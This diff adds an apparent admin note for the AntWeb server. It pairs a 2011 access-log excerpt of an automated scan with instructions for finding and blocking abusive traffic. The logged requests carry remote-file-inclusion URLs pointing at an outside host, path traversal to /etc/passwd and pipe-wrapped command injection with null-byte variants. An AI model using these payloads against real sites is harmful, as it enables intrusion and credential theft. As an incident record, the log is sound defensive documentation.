@@ -1,0 +1,70 @@
+[root@vAntWeb2 logs]# grep 222.73.228.12 access_log
+222.73.228.12 - - [13/May/2011:00:51:29 -0700] "GET / HTTP/1.1" 200 30619
+222.73.228.12 - - [13/May/2011:00:51:31 -0700] "GET /description.do?rank=http://ryumago.dragon-breath.net/hikkosi/c.txt?&project=http://ryumago.dragon-breath.net/hikkosi/c.txt? HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:32 -0700] "GET /description.do?rank=../../../../../../../../../../../etc/passwd&project=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:33 -0700] "GET /description.do?rank=%7Ccat%20/etc/passwd%7C&project=%7Ccat%20/etc/passwd%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:34 -0700] "GET /description.do?rank=%7Ccat%20/etc/passwd%00%7C&project=%7Ccat%20/etc/passwd%00%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:35 -0700] "GET /description.do?rank=%7Ccat%20/etc/passwd%00.html%7C&project=%7Ccat%20/etc/passwd%00.html%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:36 -0700] "GET /description.do?rank=%7Ccat%20/etc/passwd%00.dat%7C&project=%7Ccat%20/etc/passwd%00.dat%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:38 -0700] "GET /description.do?rank=%7Ccat%20/etc/passwd%00.txt%7C&project=%7Ccat%20/etc/passwd%00.txt%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:39 -0700] "GET /description.do?subfamily=http://ryumago.dragon-breath.net/hikkosi/c.txt?&project=http://ryumago.dragon-breath.net/hikkosi/c.txt? HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:40 -0700] "GET /description.do?subfamily=../../../../../../../../../../../etc/passwd&project=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:41 -0700] "GET /description.do?subfamily=%7Ccat%20/etc/passwd%7C&project=%7Ccat%20/etc/passwd%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:42 -0700] "GET /description.do?subfamily=%7Ccat%20/etc/passwd%00%7C&project=%7Ccat%20/etc/passwd%00%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:43 -0700] "GET /description.do?subfamily=%7Ccat%20/etc/passwd%00.html%7C&project=%7Ccat%20/etc/passwd%00.html%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:46 -0700] "GET /description.do?subfamily=%7Ccat%20/etc/passwd%00.dat%7C&project=%7Ccat%20/etc/passwd%00.dat%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:46 -0700] "GET /description.do?subfamily=%7Ccat%20/etc/passwd%00.txt%7C&project=%7Ccat%20/etc/passwd%00.txt%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:46 -0700] "GET /slideShow.do?rank=http://ryumago.dragon-breath.net/hikkosi/c.txt? HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:47 -0700] "GET /slideShow.do?rank=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:48 -0700] "GET /slideShow.do?rank=%7Ccat%20/etc/passwd%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:49 -0700] "GET /slideShow.do?rank=%7Ccat%20/etc/passwd%00%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:50 -0700] "GET /slideShow.do?rank=%7Ccat%20/etc/passwd%00.html%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:51 -0700] "GET /slideShow.do?rank=%7Ccat%20/etc/passwd%00.dat%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:53 -0700] "GET /slideShow.do?rank=%7Ccat%20/etc/passwd%00.txt%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:51:53 -0700] "GET /recentSearchResults.do?searchMethod=http://ryumago.dragon-breath.net/hikkosi/c.txt?&daysAgo=http://ryumago.dragon-breath.net/hikkosi/c.txt? HTTP/1.1" 500 1318
+222.73.228.12 - - [13/May/2011:00:51:55 -0700] "GET /recentSearchResults.do?searchMethod=../../../../../../../../../../../etc/passwd&daysAgo=../../../../../../../../../../../etc/passwd HTTP/1.1" 500 1306
+222.73.228.12 - - [13/May/2011:00:51:56 -0700] "GET /recentSearchResults.do?searchMethod=%7Ccat%20/etc/passwd%7C&daysAgo=%7Ccat%20/etc/passwd%7C HTTP/1.1" 500 1228
+222.73.228.12 - - [13/May/2011:00:51:57 -0700] "GET /recentSearchResults.do?searchMethod=%7Ccat%20/etc/passwd%00%7C&daysAgo=%7Ccat%20/etc/passwd%00%7C HTTP/1.1" 500 1231
+222.73.228.12 - - [13/May/2011:00:51:58 -0700] "GET /recentSearchResults.do?searchMethod=%7Ccat%20/etc/passwd%00.html%7C&daysAgo=%7Ccat%20/etc/passwd%00.html%7C HTTP/1.1" 500 1246
+222.73.228.12 - - [13/May/2011:00:51:59 -0700] "GET /recentSearchResults.do?searchMethod=%7Ccat%20/etc/passwd%00.dat%7C&daysAgo=%7Ccat%20/etc/passwd%00.dat%7C HTTP/1.1" 500 1243
+222.73.228.12 - - [13/May/2011:00:52:00 -0700] "GET /recentSearchResults.do?searchMethod=%7Ccat%20/etc/passwd%00.txt%7C&daysAgo=%7Ccat%20/etc/passwd%00.txt%7C HTTP/1.1" 500 1243
+222.73.228.12 - - [13/May/2011:00:52:01 -0700] "GET /description.do?genus=http://ryumago.dragon-breath.net/hikkosi/c.txt?&project=http://ryumago.dragon-breath.net/hikkosi/c.txt? HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:52:02 -0700] "GET /description.do?genus=../../../../../../../../../../../etc/passwd&project=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:52:03 -0700] "GET /description.do?genus=%7Ccat%20/etc/passwd%7C&project=%7Ccat%20/etc/passwd%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:52:04 -0700] "GET /description.do?genus=%7Ccat%20/etc/passwd%00%7C&project=%7Ccat%20/etc/passwd%00%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:52:05 -0700] "GET /description.do?genus=%7Ccat%20/etc/passwd%00.html%7C&project=%7Ccat%20/etc/passwd%00.html%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:52:06 -0700] "GET /description.do?genus=%7Ccat%20/etc/passwd%00.dat%7C&project=%7Ccat%20/etc/passwd%00.dat%7C HTTP/1.1" 200 397
+222.73.228.12 - - [13/May/2011:00:52:07 -0700] "GET /description.do?genus=%7Ccat%20/etc/passwd%00.txt%7C&project=%7Ccat%20/etc/passwd%00.txt%7C HTTP/1.1" 200 397
+
+
+
+This is from HttpUtil.java...
+
+     If server is suspected of being taken down by ungoverned traffic... 
+
+     if there are a variety of errors in the logs:
+        
+          tail --lines 1000 /home/antweb/links/antweb.log
+       
+      and if the database connection pool is filling up quickly to the point of non-functioning....
+
+          in mysql $ Show full processlist;
+          
+     Look at the bottom of log file for offenders:
+       https://www.antweb.org/web/log/accessLog.txt
+     
+     Look for something unique in the request to use to block
+       2016-10-18 14:40:48 url:https://www.antweb.org/specimenImages.do?code=casent0107470?code=casent0107470 referer:https://www.antweb.org/specimenImages.do?name=casent0107470&project=allantwebants user-agent:Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)
+     
+     Grep for your current hour in the access_log and ssl_access_log to see the number of hits.
+
+       cd /home/antweb/links
+       sudo grep "18/Oct/2016:00" ssl_access_log | wc
+
+     If much more than 10,000 / hour, it seems like someone is hammering the server.
+
+     To block, in invalidRequest below add a condition that will weed out...
+       For example see *1 in src/org/calacademy/antweb/util/HttpUtil.java.
+ 
+     See the weeded out records here:
+       https://www.antweb.org/web/log/invalid.log
